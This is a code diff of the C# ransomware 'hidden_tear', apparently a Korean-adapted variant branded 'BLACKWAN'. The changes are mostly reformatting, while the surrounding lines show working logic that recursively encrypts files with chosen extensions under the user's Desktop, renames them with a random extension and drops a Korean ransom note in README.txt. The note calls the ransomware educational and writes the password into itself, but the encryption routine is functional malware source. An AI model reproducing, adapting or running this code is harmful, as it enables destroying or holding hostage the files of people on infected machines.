@@ -23,11 +23,11 @@
  */
 
 using System;
+using System.IO;
 using System.Linq;
+using System.Security.Cryptography;
 using System.Text;
 using System.Windows.Forms;
-using System.Security.Cryptography;
-using System.IO;
 
 namespace hidden_tear
 {
@@ -95,7 +95,8 @@ namespace hidden_tear
             const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
             StringBuilder res = new StringBuilder();
             Random rnd = new Random();
-            while (0 < length--){
+            while (0 < length--)
+            {
                 res.Append(valid[rnd.Next(valid.Length)]);
             }
             return res.ToString();
@@ -127,15 +128,15 @@ namespace hidden_tear
             File.WriteAllBytes(file, bytesEncrypted);
             System.IO.File.Move(file, file + "." + filerandomname);
 
-            
-            
+
+
 
         }
 
         //encrypts target directory
         public void encryptDirectory(string location, string password)
         {
-            
+
             //extensions to be encrypt
             var validExtensions = new[]
             {
@@ -144,18 +145,20 @@ namespace hidden_tear
 
             string[] files = Directory.GetFiles(location);
             string[] childDirectories = Directory.GetDirectories(location);
-            for (int i = 0; i < files.Length; i++){
+            for (int i = 0; i < files.Length; i++)
+            {
                 string extension = Path.GetExtension(files[i]);
                 if (validExtensions.Contains(extension))
                 {
-                    EncryptFile(files[i],password);
+                    EncryptFile(files[i], password);
                 }
             }
-            for (int i = 0; i < childDirectories.Length; i++){
-                encryptDirectory(childDirectories[i],password);
+            for (int i = 0; i < childDirectories.Length; i++)
+            {
+                encryptDirectory(childDirectories[i], password);
             }
-            
-            
+
+
         }
 
         public void startAction()
@@ -163,11 +166,11 @@ namespace hidden_tear
             string password = CreatePassword(40);
             string path = "\\Desktop";
             string startPath = userDir + userName + path;
-            encryptDirectory(startPath,password);
+            encryptDirectory(startPath, password);
             messageCreator();
             string txtpath = "\\Desktop\\README.txt";
             string fullpath = userDir + userName + txtpath;
-            string[] lines = {userName + "님에게, \n귀하의 소중한 문서, 사진, 데이터베이스 및 기타 중요한 파일들이 BLACKWAN에 의해 암호화 되었습니다.\n======================================================================\n추가적인 바이러스 감염을 막기위해, 귀하의 모든 파일이 암호화 되었으며, 엑세스할 수 없습니다.\n\n파일들은 손상되지 않았지만, 잠깐 수정이 된것입니다. 따라서 다시 원본으로 되돌릴 수 있습니다.\n\n파일을 해독하는 유일한 방법은 개인 키와 복호화 프로그램을 받는것입니다.\n\n다른 소프트웨어로 파일을 수정할려고 하는 시도는 영원히 파일을 복구할 수 없게 만드는 것입니다.\n\n우리의 최첨단 복호화 프로그램은 귀하의 모든 파일을 100% 복호화 할 수 있음을 증명합니다.\n======================================================================\n이 랜섬웨어는 교육의 목적으로 만들어진 랜섬웨어입니다.\n혹시나 이 랜섬웨어에 감염이 되셨다면, 해당메일로 문의주세요!\nmail : help@esoftkorea.co.kr, DB유진\n\n암호화 폴더PATH : " + startPath + "\n- 이 key는 복호화 할때 사용되며 절대 README.txt를 삭제하시면 안됩니다. -\nPassword : " + password};
+            string[] lines = { userName + "님에게, \n귀하의 소중한 문서, 사진, 데이터베이스 및 기타 중요한 파일들이 BLACKWAN에 의해 암호화 되었습니다.\n======================================================================\n추가적인 바이러스 감염을 막기위해, 귀하의 모든 파일이 암호화 되었으며, 엑세스할 수 없습니다.\n\n파일들은 손상되지 않았지만, 잠깐 수정이 된것입니다. 따라서 다시 원본으로 되돌릴 수 있습니다.\n\n파일을 해독하는 유일한 방법은 개인 키와 복호화 프로그램을 받는것입니다.\n\n다른 소프트웨어로 파일을 수정할려고 하는 시도는 영원히 파일을 복구할 수 없게 만드는 것입니다.\n\n우리의 최첨단 복호화 프로그램은 귀하의 모든 파일을 100% 복호화 할 수 있음을 증명합니다.\n======================================================================\n이 랜섬웨어는 교육의 목적으로 만들어진 랜섬웨어입니다.\n혹시나 이 랜섬웨어에 감염이 되셨다면, 해당메일로 문의주세요!\nmail : help@esoftkorea.co.kr, DB유진\n\n암호화 폴더PATH : " + startPath + "\n- 이 key는 복호화 할때 사용되며 절대 README.txt를 삭제하시면 안됩니다. -\nPassword : " + password };
             File.WriteAllLines(fullpath, lines);
             password = null;
             Application.Exit();
